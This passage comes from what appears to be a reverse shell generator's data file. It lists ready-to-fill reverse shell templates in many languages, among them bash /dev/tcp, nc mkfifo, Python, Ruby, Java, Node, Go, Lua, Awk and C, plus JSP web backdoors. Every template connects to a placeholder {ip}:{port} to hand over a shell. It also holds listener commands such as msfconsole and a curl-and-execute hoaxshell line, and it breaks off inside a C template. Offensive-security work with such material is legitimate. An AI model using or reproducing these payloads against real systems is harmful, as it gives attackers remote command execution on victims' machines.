                                      '0, $BytesRead - 1);$Output = try '
                                      '{Invoke-Expression $Command 2>&1 | '
                                      'Out-String} catch {$_ | '
                                      'Out-String}WriteToStream '
                                      '($Output)}$StreamWriter.Close()',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'PowerShell #4 (TLS)'},
                          {'meta': ['windows', 'ReverseShell'],
                           'name': 'PowerShell #3 (Base64)'},
                          {'command': 'export RHOST="{ip}";export '
                                      "RPORT={port};python -c 'import "
                                      'sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) '
                                      'for fd in '
                                      '(0,1,2)];pty.spawn("{shell}")\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Python #1'},
                          {'command': "python -c 'import "
                                      'socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); '
                                      'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import '
                                      'pty; pty.spawn("{shell}")\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Python #2'},
                          {'command': 'export RHOST="{ip}";export '
                                      "RPORT={port};python3 -c 'import "
                                      'sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) '
                                      'for fd in '
                                      '(0,1,2)];pty.spawn("{shell}")\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Python3 #1'},
                          {'command': "python3 -c 'import "
                                      'socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); '
                                      'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import '
                                      'pty; pty.spawn("{shell}")\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Python3 #2'},
                          {'command': 'import os,socket,subprocess,threading;\n'
                                      'def s2p(s, p):\n'
                                      '    while True:\n'
                                      '        data = s.recv(1024)\n'
                                      '        if len(data) > 0:\n'
                                      '            p.stdin.write(data)\n'
                                      '            p.stdin.flush()\n'
                                      '\n'
                                      'def p2s(s, p):\n'
                                      '    while True:\n'
                                      '        s.send(p.stdout.read(1))\n'
                                      '\n'
                                      's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
                                      's.connect(("{ip}",{port}))\n'
                                      '\n'
                                      'p=subprocess.Popen(["{shell}"], '
                                      'stdout=subprocess.PIPE, '
                                      'stderr=subprocess.STDOUT, '
                                      'stdin=subprocess.PIPE)\n'
                                      '\n'
                                      's2p_thread = '
                                      'threading.Thread(target=s2p, args=[s, '
                                      'p])\n'
                                      's2p_thread.daemon = True\n'
                                      's2p_thread.start()\n'
                                      '\n'
                                      'p2s_thread = '
                                      'threading.Thread(target=p2s, args=[s, '
                                      'p])\n'
                                      'p2s_thread.daemon = True\n'
                                      'p2s_thread.start()\n'
                                      '\n'
                                      'try:\n'
                                      '    p.wait()\n'
                                      'except KeyboardInterrupt:\n'
                                      '    s.close()',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'Python3 Windows'},
                          {'command': "python3 -c 'import "
                                      'os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for '
                                      'f in(0,1,2)];pty.spawn("{shell}")\'',
                           'meta': ['linux', 'ReverseShell'],
                           'name': 'Python3 shortest'},
                          {'command': 'ruby -rsocket '
                                      '-e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Ruby #1'},
                          {'command': "ruby -rsocket -e'exit if "
                                      'fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! '
                                      'if $_=="exit");($_=~/cd '
                                      '(.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print '
                                      'io.read}))rescue c.puts "failed: '
                                      '#{$_}"}\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Ruby no sh'},
                          {'command': 'socat TCP:{ip}:{port} EXEC:{shell}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'socat #1'},
                          {'command': 'socat TCP:{ip}:{port} '
                                      "EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'socat #2 (TTY)'},
                          {'command': "sqlite3 /dev/null '.shell rm "
                                      '/tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} '
                                      "-i 2>&1|nc {ip} {port} >/tmp/f'",
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'sqlite3 nc mkfifo'},
                          {'command': "require('child_process').exec('nc -e "
                                      "{shell} {ip} {port}')",
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'node.js'},
                          {'command': '(function(){\r\n'
                                      '    var net = require("net"),\r\n'
                                      '        cp = '
                                      'require("child_process"),\r\n'
                                      '        sh = cp.spawn("{shell}", '
                                      '[]);\r\n'
                                      '    var client = new net.Socket();\r\n'
                                      '    client.connect({port}, "{ip}", '
                                      'function(){\r\n'
                                      '        client.pipe(sh.stdin);\r\n'
                                      '        sh.stdout.pipe(client);\r\n'
                                      '        sh.stderr.pipe(client);\r\n'
                                      '    });\r\n'
                                      '    return /a/; // Prevents the Node.js '
                                      'application from crashing\r\n'
                                      '})();',
                           'meta': ['linux', 'mac', 'windows', 'ReverseShell'],
                           'name': 'node.js #2'},
                          {'command': 'public class shell {\n'
                                      '    public static void main(String[] '
                                      'args) {\n'
                                      '        Process p;\n'
                                      '        try {\n'
                                      '            p = '
                                      'Runtime.getRuntime().exec("bash -c '
                                      '$@|bash 0 echo bash -i >& '
                                      '/dev/tcp/{ip}/{port} 0>&1");\n'
                                      '            p.waitFor();\n'
                                      '            p.destroy();\n'
                                      '        } catch (Exception e) {}\n'
                                      '    }\n'
                                      '}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Java #1'},
                          {'command': 'public class shell {\n'
                                      '    public static void main(String[] '
                                      'args) {\n'
                                      '        ProcessBuilder pb = new '
                                      'ProcessBuilder("bash", "-c", "$@| bash '
                                      '-i >& /dev/tcp/{ip}/{port} 0>&1")\n'
                                      '            '
                                      '.redirectErrorStream(true);\n'
                                      '        try {\n'
                                      '            Process p = pb.start();\n'
                                      '            p.waitFor();\n'
                                      '            p.destroy();\n'
                                      '        } catch (Exception e) {}\n'
                                      '    }\n'
                                      '}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Java #2'},
                          {'command': 'import java.io.InputStream;\n'
                                      'import java.io.OutputStream;\n'
                                      'import java.net.Socket;\n'
                                      '\n'
                                      'public class shell {\n'
                                      '    public static void main(String[] '
                                      'args) {\n'
                                      '        String host = "{ip}";\n'
                                      '        int port = {port};\n'
                                      '        String cmd = "{shell}";\n'
                                      '        try {\n'
                                      '            Process p = new '
                                      'ProcessBuilder(cmd).redirectErrorStream(true).start();\n'
                                      '            Socket s = new Socket(host, '
                                      'port);\n'
                                      '            InputStream pi = '
                                      'p.getInputStream(), pe = '
                                      'p.getErrorStream(), si = '
                                      's.getInputStream();\n'
                                      '            OutputStream po = '
                                      'p.getOutputStream(), so = '
                                      's.getOutputStream();\n'
                                      '            while (!s.isClosed()) {\n'
                                      '                while (pi.available() > '
                                      '0)\n'
                                      '                    '
                                      'so.write(pi.read());\n'
                                      '                while (pe.available() > '
                                      '0)\n'
                                      '                    '
                                      'so.write(pe.read());\n'
                                      '                while (si.available() > '
                                      '0)\n'
                                      '                    '
                                      'po.write(si.read());\n'
                                      '                so.flush();\n'
                                      '                po.flush();\n'
                                      '                Thread.sleep(50);\n'
                                      '                try {\n'
                                      '                    p.exitValue();\n'
                                      '                    break;\n'
                                      '                } catch (Exception e) '
                                      '{}\n'
                                      '            }\n'
                                      '            p.destroy();\n'
                                      '            s.close();\n'
                                      '        } catch (Exception e) {}\n'
                                      '    }\n'
                                      '}',
                           'meta': ['windows', 'linux', 'mac', 'ReverseShell'],
                           'name': 'Java #3'},
                          {'command': '<%@\r\n'
                                      'page import="java.lang.*, java.util.*, '
                                      'java.io.*, java.net.*"\r\n'
                                      '% >\r\n'
                                      '<%!\r\n'
                                      'static class StreamConnector extends '
                                      'Thread\r\n'
                                      '{\r\n'
                                      '        InputStream is;\r\n'
                                      '        OutputStream os;\r\n'
                                      '        StreamConnector(InputStream is, '
                                      'OutputStream os)\r\n'
                                      '        {\r\n'
                                      '                this.is = is;\r\n'
                                      '                this.os = os;\r\n'
                                      '        }\r\n'
                                      '        public void run()\r\n'
                                      '        {\r\n'
                                      '                BufferedReader isr = '
                                      'null;\r\n'
                                      '                BufferedWriter osw = '
                                      'null;\r\n'
                                      '                try\r\n'
                                      '                {\r\n'
                                      '                        isr = new '
                                      'BufferedReader(new '
                                      'InputStreamReader(is));\r\n'
                                      '                        osw = new '
                                      'BufferedWriter(new '
                                      'OutputStreamWriter(os));\r\n'
                                      '                        char buffer[] = '
                                      'new char[8192];\r\n'
                                      '                        int lenRead;\r\n'
                                      '                        while( (lenRead '
                                      '= isr.read(buffer, 0, buffer.length)) > '
                                      '0)\r\n'
                                      '                        {\r\n'
                                      '                                '
                                      'osw.write(buffer, 0, lenRead);\r\n'
                                      '                                '
                                      'osw.flush();\r\n'
                                      '                        }\r\n'
                                      '                }\r\n'
                                      '                catch (Exception '
                                      'ioe)\r\n'
                                      '                try\r\n'
                                      '                {\r\n'
                                      '                        if(isr != null) '
                                      'isr.close();\r\n'
                                      '                        if(osw != null) '
                                      'osw.close();\r\n'
                                      '                }\r\n'
                                      '                catch (Exception '
                                      'ioe)\r\n'
                                      '        }\r\n'
                                      '}\r\n'
                                      '%>\r\n'
                                      '\r\n'
                                      '<h1>JSP Backdoor Reverse Shell</h1>\r\n'
                                      '\r\n'
                                      '<form method="post">\r\n'
                                      'IP Address\r\n'
                                      '<input type="text" name="ipaddress" '
                                      'size=30>\r\n'
                                      'Port\r\n'
                                      '<input type="text" name="port" '
                                      'size=10>\r\n'
                                      '<input type="submit" name="Connect" '
                                      'value="Connect">\r\n'
                                      '</form>\r\n'
                                      '<p>\r\n'
                                      '<hr>\r\n'
                                      '\r\n'
                                      '<%\r\n'
                                      'String ipAddress = '
                                      'request.getParameter("ipaddress");\r\n'
                                      'String ipPort = '
                                      'request.getParameter("port");\r\n'
                                      'if(ipAddress != null && ipPort != '
                                      'null)\r\n'
                                      '{\r\n'
                                      '        Socket sock = null;\r\n'
                                      '        try\r\n'
                                      '        {\r\n'
                                      '                sock = new '
                                      'Socket(ipAddress, (new '
                                      'Integer(ipPort)).intValue());\r\n'
                                      '                Runtime rt = '
                                      'Runtime.getRuntime();\r\n'
                                      '                Process proc = '
                                      'rt.exec("cmd.exe");\r\n'
                                      '                StreamConnector '
                                      'outputConnector =\r\n'
                                      '                        new '
                                      'StreamConnector(proc.getInputStream(),\r\n'
                                      '                                          '
                                      'sock.getOutputStream());\r\n'
                                      '                StreamConnector '
                                      'inputConnector =\r\n'
                                      '                        new '
                                      'StreamConnector(sock.getInputStream(),\r\n'
                                      '                                          '
                                      'proc.getOutputStream());\r\n'
                                      '                '
                                      'outputConnector.start();\r\n'
                                      '                '
                                      'inputConnector.start();\r\n'
                                      '        }\r\n'
                                      '        catch(Exception e) \r\n'
                                      '}\r\n'
                                      '%>',
                           'meta': ['windows', 'linux', 'mac', 'ReverseShell'],
                           'name': 'Java Web'},
                          {'command': '<%\r\n'
                                      '    /*\r\n'
                                      '     * Usage: This is a 2 way shell, '
                                      'one web shell and a reverse shell. '
                                      'First, it will try to connect to a '
                                      'listener (atacker machine), with the IP '
                                      'and Port specified at the end of the '
                                      'file.\r\n'
                                      '     * If it cannot connect, an HTML '
                                      'will prompt and you can input commands '
                                      '(sh/cmd) there and it will prompts the '
                                      'output in the HTML.\r\n'
                                      '     * Note that this last '
                                      'functionality is slow, so the first one '
                                      '(reverse shell) is recommended. Each '
                                      'time the button "send" is clicked, it '
                                      'will try to connect to the reverse '
                                      'shell again (apart from executing \r\n'
                                      '     * the command specified in the '
                                      'HTML form). This is to avoid to keep it '
                                      'simple.\r\n'
                                      '     */\r\n'
                                      '%>\r\n'
                                      '\r\n'
                                      '<%@page import="java.lang.*"%>\r\n'
                                      '<%@page import="java.io.*"%>\r\n'
                                      '<%@page import="java.net.*"%>\r\n'
                                      '<%@page import="java.util.*"%>\r\n'
                                      '\r\n'
                                      '<html>\r\n'
                                      '<head>\r\n'
                                      '    <title>jrshell</title>\r\n'
                                      '</head>\r\n'
                                      '<body>\r\n'
                                      '<form METHOD="POST" NAME="myform" '
                                      'ACTION="">\r\n'
                                      '    <input TYPE="text" NAME="shell">\r\n'
                                      '    <input TYPE="submit" '
                                      'VALUE="Send">\r\n'
                                      '</form>\r\n'
                                      '<pre>\r\n'
                                      '<%\r\n'
                                      '    // Define the OS\r\n'
                                      '    String shellPath = null;\r\n'
                                      '    try\r\n'
                                      '    {\r\n'
                                      '        if '
                                      '(System.getProperty("os.name").toLowerCase().indexOf("windows") '
                                      '== -1) {\r\n'
                                      '            shellPath = new '
                                      'String("/bin/sh");\r\n'
                                      '        } else {\r\n'
                                      '            shellPath = new '
                                      'String("cmd.exe");\r\n'
                                      '        }\r\n'
                                      '    } catch( Exception e ){}\r\n'
                                      '    // INNER HTML PART\r\n'
                                      '    if (request.getParameter("shell") '
                                      '!= null) {\r\n'
                                      '        out.println("Command: " + '
                                      'request.getParameter("shell") + '
                                      '"\\n<BR>");\r\n'
                                      '        Process p;\r\n'
                                      '        if '
                                      '(shellPath.equals("cmd.exe"))\r\n'
                                      '            p = '
                                      'Runtime.getRuntime().exec("cmd.exe /c " '
                                      '+ request.getParameter("shell"));\r\n'
                                      '        else\r\n'
                                      '            p = '
                                      'Runtime.getRuntime().exec("/bin/sh -c " '
                                      '+ request.getParameter("shell"));\r\n'
                                      '        OutputStream os = '
                                      'p.getOutputStream();\r\n'
                                      '        InputStream in = '
                                      'p.getInputStream();\r\n'
                                      '        DataInputStream dis = new '
                                      'DataInputStream(in);\r\n'
                                      '        String disr = '
                                      'dis.readLine();\r\n'
                                      '        while ( disr != null ) {\r\n'
                                      '            out.println(disr);\r\n'
                                      '            disr = dis.readLine();\r\n'
                                      '        }\r\n'
                                      '    }\r\n'
                                      '    // TCP PORT PART\r\n'
                                      '    class StreamConnector extends '
                                      'Thread\r\n'
                                      '    {\r\n'
                                      '        InputStream wz;\r\n'
                                      '        OutputStream yr;\r\n'
                                      '        StreamConnector( InputStream '
                                      'wz, OutputStream yr ) {\r\n'
                                      '            this.wz = wz;\r\n'
                                      '            this.yr = yr;\r\n'
                                      '        }\r\n'
                                      '        public void run()\r\n'
                                      '        {\r\n'
                                      '            BufferedReader r  = '
                                      'null;\r\n'
                                      '            BufferedWriter w = null;\r\n'
                                      '            try\r\n'
                                      '            {\r\n'
                                      '                r  = new '
                                      'BufferedReader(new '
                                      'InputStreamReader(wz));\r\n'
                                      '                w = new '
                                      'BufferedWriter(new '
                                      'OutputStreamWriter(yr));\r\n'
                                      '                char buffer[] = new '
                                      'char[8192];\r\n'
                                      '                int length;\r\n'
                                      '                while( ( length = '
                                      'r.read( buffer, 0, buffer.length ) ) > '
                                      '0 )\r\n'
                                      '                {\r\n'
                                      '                    w.write( buffer, 0, '
                                      'length );\r\n'
                                      '                    w.flush();\r\n'
                                      '                }\r\n'
                                      '            } catch( Exception e ){}\r\n'
                                      '            try\r\n'
                                      '            {\r\n'
                                      '                if( r != null )\r\n'
                                      '                    r.close();\r\n'
                                      '                if( w != null )\r\n'
                                      '                    w.close();\r\n'
                                      '            } catch( Exception e ){}\r\n'
                                      '        }\r\n'
                                      '    }\r\n'
                                      ' \r\n'
                                      '    try {\r\n'
                                      '        Socket socket = new Socket( '
                                      '"{ip}", {port} ); // Replace with '
                                      'wanted ip and port\r\n'
                                      '        Process process = '
                                      'Runtime.getRuntime().exec( shellPath '
                                      ');\r\n'
                                      '        new '
                                      'StreamConnector(process.getInputStream(), '
                                      'socket.getOutputStream()).start();\r\n'
                                      '        new '
                                      'StreamConnector(socket.getInputStream(), '
                                      'process.getOutputStream()).start();\r\n'
                                      '        out.println("port opened on " + '
                                      'socket);\r\n'
                                      '     } catch( Exception e ) {}\r\n'
                                      '%>\r\n'
                                      '</pre>\r\n'
                                      '</body>\r\n'
                                      '</html>',
                           'meta': ['windows', 'linux', 'mac', 'ReverseShell'],
                           'name': 'Java Two Way'},
                          {'command': 'String command = "var host = \'{ip}\';" '
                                      '+\r\n'
                                      '                       "var port = '
                                      '{port};" +\r\n'
                                      '                       "var cmd = '
                                      '\'{shell}\';"+\r\n'
                                      '                       "var s = new '
                                      'java.net.Socket(host, port);" +\r\n'
                                      '                       "var p = new '
                                      'java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+\r\n'
                                      '                       "var pi = '
                                      'p.getInputStream(), pe = '
                                      'p.getErrorStream(), si = '
                                      's.getInputStream();"+\r\n'
                                      '                       "var po = '
                                      'p.getOutputStream(), so = '
                                      's.getOutputStream();"+\r\n'
                                      '                       "print '
                                      '(\'Connected\');"+\r\n'
                                      '                       "while '
                                      '(!s.isClosed()) {"+\r\n'
                                      '                       "    while '
                                      '(pi.available() > 0)"+\r\n'
                                      '                       "        '
                                      'so.write(pi.read());"+\r\n'
                                      '                       "    while '
                                      '(pe.available() > 0)"+\r\n'
                                      '                       "        '
                                      'so.write(pe.read());"+\r\n'
                                      '                       "    while '
                                      '(si.available() > 0)"+\r\n'
                                      '                       "        '
                                      'po.write(si.read());"+\r\n'
                                      '                       "    '
                                      'so.flush();"+\r\n'
                                      '                       "    '
                                      'po.flush();"+\r\n'
                                      '                       "    '
                                      'java.lang.Thread.sleep(50);"+\r\n'
                                      '                       "    try {"+\r\n'
                                      '                       "        '
                                      'p.exitValue();"+\r\n'
                                      '                       "        '
                                      'break;"+\r\n'
                                      '                       "    }"+\r\n'
                                      '                       "    catch (e) '
                                      '{"+\r\n'
                                      '                       "    }"+\r\n'
                                      '                       "}"+\r\n'
                                      '                       '
                                      '"p.destroy();"+\r\n'
                                      '                       "s.close();";\r\n'
                                      'String x = '
                                      '"\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";\r\n'
                                      'ref.add(new StringRefAddr("x", x);',
                           'meta': ['linux', 'mac', 'windows', 'ReverseShell'],
                           'name': 'Javascript'},
                          {'command': 'String host="{ip}";int '
                                      'port={port};String '
                                      'cmd="{shell}";Process p=new '
                                      'ProcessBuilder(cmd).redirectErrorStream(true).start();Socket '
                                      's=new Socket(host,port);InputStream '
                                      'pi=p.getInputStream(),pe=p.getErrorStream(), '
                                      'si=s.getInputStream();OutputStream '
                                      'po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try '
                                      '{p.exitValue();break;}catch (Exception '
                                      'e){}};p.destroy();s.close();',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'Groovy'},
                          {'command': 'TF=$(mktemp -u);mkfifo $TF && telnet '
                                      '{ip} {port} 0<$TF | {shell} 1>$TF',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'telnet'},
                          {'command': "zsh -c 'zmodload zsh/net/tcp && ztcp "
                                      '{ip} {port} && zsh >&$REPLY 2>&$REPLY '
                                      "0>&$REPLY'",
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'zsh'},
                          {'command': 'lua -e '
                                      '"require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'{shell} '
                                      '-i <&3 >&3 2>&3\');"',
                           'meta': ['linux', 'ReverseShell'],
                           'name': 'Lua #1'},
                          {'command': 'lua5.1 -e \'local host, port = "{ip}", '
                                      '{port} local socket = require("socket") '
                                      'local tcp = socket.tcp() local io = '
                                      'require("io") tcp:connect(host, port); '
                                      'while true do local cmd, status, '
                                      'partial = tcp:receive() local f = '
                                      'io.popen(cmd, "r") local s = '
                                      'f:read("*a") f:close() tcp:send(s) if '
                                      'status == "closed" then break end end '
                                      "tcp:close()'",
                           'meta': ['linux', 'windows', 'ReverseShell'],
                           'name': 'Lua #2'},
                          {'command': "echo 'package "
                                      'main;import"os/exec";import"net";func '
                                      'main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' '
                                      '> /tmp/t.go && go run /tmp/t.go && rm '
                                      '/tmp/t.go',
                           'meta': ['linux', 'mac', 'windows', 'ReverseShell'],
                           'name': 'Golang'},
                          {'command': "echo 'import os' > /tmp/t.v && echo 'fn "
                                      'main() { os.system("nc -e {shell} {ip} '
                                      '{port} 0>&1") }\' >> /tmp/t.v && v run '
                                      '/tmp/t.v && rm /tmp/t.v',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Vlang'},
                          {'command': "awk 'BEGIN {s = "
                                      '"/inet/tcp/0/{ip}/{port}"; while(42) { '
                                      'do{ printf "shell>" |& s; s |& getline '
                                      'c; if(c){ while ((c |& getline) > 0) '
                                      'print $0 |& s; close(c); } } while(c != '
                                      '"exit") close(s); }}\' /dev/null',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Awk'},
                          {'command': "import 'dart:io';\n"
                                      "import 'dart:convert';\n"
                                      '\n'
                                      'main() {\n'
                                      '  Socket.connect("{ip}", '
                                      '{port}).then((socket) {\n'
                                      '    socket.listen((data) {\n'
                                      "      Process.start('{shell}', "
                                      '[]).then((Process process) {\n'
                                      '        process.stdin.writeln(new '
                                      'String.fromCharCodes(data).trim());\n'
                                      '        process.stdout\n'
                                      '          .transform(utf8.decoder)\n'
                                      '          .listen((output) { '
                                      'socket.write(output); });\n'
                                      '      });\n'
                                      '    },\n'
                                      '    onDone: () {\n'
                                      '      socket.destroy();\n'
                                      '    });\n'
                                      '  });\n'
                                      '}',
                           'meta': ['linux', 'mac', 'windows', 'ReverseShell'],
                           'name': 'Dart'},
                          {'command': "crystal eval 'require "
                                      '"process";require '
                                      '"socket";c=Socket.tcp(Socket::Family::INET);c.connect("{ip}",{port});loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}\'',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'Crystal (system)'},
                          {'command': 'require "process"\n'
                                      'require "socket"\n'
                                      '\n'
                                      'c = Socket.tcp(Socket::Family::INET)\n'
                                      'c.connect("{ip}", {port})\n'
                                      'loop do \n'
                                      '  m, l = c.receive\n'
                                      '  p = Process.new(m.rstrip("\\n"), '
                                      'output:Process::Redirect::Pipe, '
                                      'shell:true)\n'
                                      '  c << p.output.gets_to_end\n'
                                      'end',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Crystal (code)'}],
 'rsgData': {'listenerCommands': [['nc', 'nc -lvnp {port}'],
                                  ['nc freebsd', 'nc -lvn {port}'],
                                  ['busybox nc', 'busybox nc -lp {port}'],
                                  ['ncat', 'ncat -lvnp {port}'],
                                  ['ncat.exe', 'ncat.exe -lvnp {port}'],
                                  ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
                                  ['rlwrap + nc',
                                   'rlwrap -cAr nc -lvnp {port}'],
                                  ['rustcat', 'rcat listen {port}'],
                                  ['pwncat', 'python3 -m pwncat -lp {port}'],
                                  ['windows ConPty',
                                   'stty raw -echo; (stty size; cat) | nc '
                                   '-lvnp {port}'],
                                  ['socat',
                                   'socat -d -d TCP-LISTEN:{port} STDOUT'],
                                  ['socat (TTY)',
                                   'socat -d -d file:`tty`,raw,echo=0 '
                                   'TCP-LISTEN:{port}'],
                                  ['powercat', 'powercat -l -p {port}'],
                                  ['msfconsole',
                                   'msfconsole -q -x "use multi/handler; set '
                                   'payload {payload}; set lhost {ip}; set '
                                   'lport {port}; exploit"'],
                                  ['hoaxshell',
                                   'python3 -c "$(curl -s '
                                   'https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" '
                                   '-t {type} -p {port}']],
             'reverseShellCommands': [{'command': '{shell} -i >& '
                                                  '/dev/tcp/{ip}/{port} 0>&1',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Bash -i'},
                                      {'command': '0<&196;exec '
                                                  '196<>/dev/tcp/{ip}/{port}; '
                                                  '{shell} <&196 >&196 2>&196',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Bash 196'},
                                      {'command': 'exec '
                                                  '5<>/dev/tcp/{ip}/{port};cat '
                                                  '<&5 | while read line; do '
                                                  '$line 2>&5 >&5; done',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Bash read line'},
                                      {'command': '{shell} -i 5<> '
                                                  '/dev/tcp/{ip}/{port} 0<&5 '
                                                  '1>&5 2>&5',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Bash 5'},
                                      {'command': '{shell} -i >& '
                                                  '/dev/udp/{ip}/{port} 0>&1',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Bash udp'},
                                      {'command': 'rm /tmp/f;mkfifo /tmp/f;cat '
                                                  '/tmp/f|{shell} -i 2>&1|nc '
                                                  '{ip} {port} >/tmp/f',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'nc mkfifo'},
                                      {'command': 'nc {ip} {port} -e {shell}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'nc -e'},
                                      {'command': 'nc.exe {ip} {port} -e '
                                                  '{shell}',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'nc.exe -e'},
                                      {'command': 'busybox nc {ip} {port} -e '
                                                  '{shell}',
                                       'meta': ['linux', 'ReverseShell'],
                                       'name': 'BusyBox nc -e'},
                                      {'command': 'nc -c {shell} {ip} {port}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'nc -c'},
                                      {'command': 'ncat {ip} {port} -e {shell}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'ncat -e'},
                                      {'command': 'ncat.exe {ip} {port} -e '
                                                  '{shell}',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'ncat.exe -e'},
                                      {'command': 'rm /tmp/f;mkfifo /tmp/f;cat '
                                                  '/tmp/f|{shell} -i 2>&1|ncat '
                                                  '-u {ip} {port} >/tmp/f',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'ncat udp'},
                                      {'command': "C='curl -Ns "
                                                  "telnet://{ip}:{port}'; $C "
                                                  '</dev/null 2>&1 | {shell} '
                                                  '2>&1 | $C >/dev/null',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'curl'},
                                      {'command': 'rcat connect -s {shell} '
                                                  '{ip} {port}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'rustcat'},
                                      {'command': '#include <stdio.h>\n'
                                                  '#include <sys/socket.h>\n'
                                                  '#include <sys/types.h>\n'
                                                  '#include <stdlib.h>\n'
                                                  '#include <unistd.h>\n'
                                                  '#include <netinet/in.h>\n'
                                                  '#include <arpa/inet.h>\n'
                                                  '\n'
                                                  'int main(void){\n'
                                                  '    int port = {port};\n'
                                                  '    struct sockaddr_in '
                                                  'revsockaddr;\n'
                                                  '\n'
                                                  '    int sockt = '
                                                  'socket(AF_INET, '
                                                  'SOCK_STREAM, 0);\n'
                                                  '    revsockaddr.sin_family '
                                                  '= AF_INET;       \n'
                                                  '    revsockaddr.sin_port = '
                                                  'htons(port);\n'
                                                  '    '
                                                  'revsockaddr.sin_addr.s_addr '
                                                  '= inet_addr("{ip}");\n'
                                                  '\n'
                                                  '    connect(sockt, (struct '
                                                  'sockaddr *) &revsockaddr, \n'
                                                  '    sizeof(revsockaddr));\n'
                                                  '    dup2(sockt, 0);\n'
                                                  '    dup2(sockt, 1);\n'
                                                  '    dup2(sockt, 2);\n'
                                                  '\n'
                                                  '    char * const argv[] = '
                                                  '{"{shell}", NULL};\n'
                                                  '    execve("{shell}", argv, '
                                                  'NULL);\n'
                                                  '\n'
                                                  '    return 0;       \n'
                                                  '}',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'C'},
                                      {'command': '#include <winsock2.h>\r\n'
                                                  '#include <stdio.h>\r\n'
                                                  '#pragma '
                                                  'comment(lib,"ws2_32")\r\n'
                                                  '\r\n'
                                                  'WSADATA wsaData;\r\n'
                                                  'SOCKET Winsock;\r\n'
                                                  'struct sockaddr_in hax; \r\n'
                                                  'char ip_addr[16] = '
                                                  '"{ip}"; \r\n'
                                                  'char port[6] = '
                                                  '"{port}";            \r\n'
                                                  '\r\n'
                                                  'STARTUPINFO '
                                                  'ini_processo;\r\n'
                                                  '\r\n'
                                                  'PROCESS_INFORMATION '
                                                  'processo_info;\r\n'
                                                  '\r\n'
                                                  'int main()\r\n'
                                                  '{\r\n'
                                                  '    WSAStartup(MAKEWORD(2, '
                                                  '2), &wsaData);\r\n'
                                                  '    Winsock = '
                                                  'WSASocket(AF_INET, '
                                                  'SOCK_STREAM, IPPROTO_TCP, '
                                                  'NULL, (unsigned int)NULL, '
                                                  '(unsigned int)NULL);\r\n'
                                                  '\r\n'
                                                  '\r\n'
                                                  '    struct hostent '
                                                  '*host; \r\n'
                                                  '    host = '
